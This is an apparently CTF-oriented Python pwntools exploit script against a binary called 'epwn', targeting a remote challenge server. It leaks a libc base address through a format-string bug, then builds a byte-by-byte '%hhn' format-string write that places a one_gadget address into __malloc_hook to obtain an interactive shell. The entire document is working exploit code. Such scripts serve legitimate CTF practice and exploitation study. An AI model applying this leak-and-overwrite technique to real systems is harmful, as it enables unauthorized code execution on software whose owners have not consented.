import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io = process(['./epwn'])#, env={'LD_PRELOAD':'./libc-2.27.so'})
	elf=ELF('./epwn')
	libc=ELF('./libc-2.27.so')
else :
	io=remote('nc.eonew.cn',10010)
	elf=ELF('./epwn')
	libc=ELF('./libc-2.27.so')


def fmt(addr1,addr2):

	arg0=(addr1)&0xff
	arg1=(addr1&0xff00)>>8
	arg2=(addr1&0xff0000)>>16
	arg3=(addr1&0xff000000)>>24
	arg4=(addr1&0xff00000000)>>32
	arg5=(addr1&0xff0000000000)>>40
	# arg6=(addr1&0xff000000000000)>>48
	# arg7=(addr1&0xff00000000000000)>>56
	#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
	pay1='%'+str(arg0)+'c%18$hhn'
	pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%19$hhn'
	pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%20$hhn'
	pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%21$hhn'
	pay5='%'+str((arg4-arg3+0x100)%0x100)+'c%22$hhn'
	pay6='%'+str((arg5-arg4+0x100)%0x100)+'c%23$hhn'
	# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
	# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
	
	pay=pay1+pay2+pay3+pay4+pay5+pay6
	pay+='%100110c'
	pay=pay.ljust(0x50,'\x00')
	for i in range(6):
		pay+=p64(addr2+i)

	io.send(pay)
			


io.recv()
io.sendline('1')
io.recv()
io.sendline('%a%a')
io.recv(11)
libc_base=(int(io.recv(10),16)<<8)-libc.sym['_IO_2_1_stdin_']
libc.address=libc_base
success('libc_base:'+hex(libc_base))
one_gadget_addr=libc_base+0x4f322
success('one_gadget_addr:'+hex(one_gadget_addr))
io.sendline('2')
# gdb.attach(io)
# pause()
pay=fmt(one_gadget_addr,libc.sym['__malloc_hook'])



#gdb.attach(io)
#pause()
io.interactive()